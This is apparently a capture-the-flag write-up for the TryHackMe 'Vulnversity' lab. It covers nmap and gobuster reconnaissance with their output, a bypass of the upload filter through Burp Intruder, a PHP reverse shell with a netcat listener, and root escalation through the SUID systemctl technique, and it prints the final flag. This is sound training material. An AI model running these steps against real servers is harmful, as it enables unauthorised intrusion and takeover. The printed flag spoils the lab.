# Vulnversity

Attack Machine = 10.10.69.90

## Reconnaissance

- It's important to run initial NMAP scans to gather information about a given IP. Look for open ports, operating systems, and version information.

```console
root@ip-10-10-140-213:~# nmap -sC -sV -oX init.xml 10.10.69.90

Starting Nmap 7.60 ( https://nmap.org ) at 2022-10-13 13:22 BST
Nmap scan report for ip-10-10-69-90.eu-west-1.compute.internal (10.10.69.90)
Host is up (0.0013s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (EdDSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
MAC Address: 02:6C:CC:45:E5:DF (Unknown)
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2022-10-13T08:22:45-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-10-13 13:22:45
|_  start_date: 1600-12-31 23:58:45

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.43 seconds
```

It's important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)

- Use GoBuster to locate directories that can be used to upload a shell.

    `gobuster dir -u http://10.10.69.90:3333 -w /usr/share/wordlists/dirb/common.txt`

```console
root@ip-10-10-140-213:~# gobuster dir -u http://10.10.69.90:3333 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.69.90:3333
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/10/13 13:30:51 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/internal (Status: 301)
/js (Status: 301)
/server-status (Status: 403)
===============================================================
2022/10/13 13:30:52 Finished
===============================================================
```

We noticed the directory /internal allows us to upload files, which can be used.

- Now you have found a form to upload files, we can leverage this to upload and execute our payload that will lead to compromising the web server. To determine what extensions are not blocked by the webserver we can use BurpSuite.

1. Create a wordlist of file extensions `nano phpext.txt`
2. Ensure BurpSuite is configured to intercept all your browser traffic. Upload a file, once this request is captured, send it to the Intruder. Click on "Payloads" and select the "Sniper" attack type. Click the "Positions" tab now, find the filename and "Add §" to the extension. After running the attack we determine _.phtml_ is the right extension.
3. Use a PHP reverse shell as our payload. A reverse shell works by being called on the remote host and forcing this host to make a connection to you. So you'll listen for incoming connections, upload and have your shell executed which will beacon out to you to control!

Download the following reverse PHP shell [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

To gain remote access to this machine, follow these steps:

1. Edit the php-reverse-shell.php file and edit the ip to be your tun0 ip (you can get this by going to <http://10.10.10.10> in the browser of your TryHackMe connected device).
2. Rename this file to php-reverse-shell.phtml
3. We're now going to listen to incoming connections using netcat. Run the following command: **nc -lvnp 1234**
4. Upload your shell and navigate to **http://<ip>:3333/internal/uploads/php-reverse-shell.phtml** - This will execute your payload
5. You should see a connection on your netcat session.

- Once inside the machine, run the following to get the flag and see what users are available.

    `cd home;ls;cd bill;ls;cat user.txt`

- Use the following command to find files with the SUID bit attached. For potential privilege escalation.

    `find / -user root -perm -4000 -exec ls -ldb {} \;`

Using GTFOBins and the output from the search we can use _systemctl_ to gain privileges.

```console
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
...
sh -p
```

- Once access is gained, search for the flag.

    `cat /root/root.txt`

**a58ff8579f0a9270368d33a9966c7fd5**
